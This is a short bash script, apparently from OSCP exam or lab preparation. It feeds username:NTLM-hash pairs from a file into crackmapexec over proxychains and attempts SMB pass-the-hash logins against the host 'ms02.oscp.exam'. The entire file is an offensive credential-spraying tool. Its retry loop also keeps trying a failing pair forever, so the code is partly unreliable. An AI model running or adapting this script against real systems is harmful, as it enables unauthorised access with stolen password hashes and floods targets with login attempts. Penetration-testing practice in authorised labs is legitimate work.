#!/bin/bash

# Check if a file containing key-value pairs has been provided as argument
if [ $# -ne 1 ]; then
  echo "Usage: $0 <file>"
  exit 1
fi

# Read each line of the file, split it into key and value, and pass them as arguments to proxychains
options=$(cat "$1")
count=0
for option in $options; do
  key=$(echo "$option" | cut -d':' -f1)
  value=$(echo "$option" | cut -d':' -f2)
  while true; do
    proxychains -q crackmapexec smb ms02.oscp.exam -u "$key" -H "$value"
    if [ $? -eq 0 ]; then
      break
    else
      sleep 1
      continue
    fi
  done
  count=$((count+1))
  if [ $count -eq $(echo "$options" | wc -l) ]; then
    break
  fi
done